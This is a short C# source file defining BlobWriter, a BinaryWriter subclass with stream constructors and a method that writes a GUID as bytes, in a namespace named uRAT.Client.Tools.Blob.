using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace uRAT.Client.Tools.Blob
{
    internal class BlobWriter : BinaryWriter
    {
        protected BlobWriter()
        {
        }

        public BlobWriter(Stream output) 
            : base(output)
        {
        }

        public BlobWriter(Stream output, Encoding encoding) 
            : base(output, encoding)
        {
        }

        public void WriteGuid(Guid guid)
        {
            Write(guid.ToByteArray());
        }
    }
}
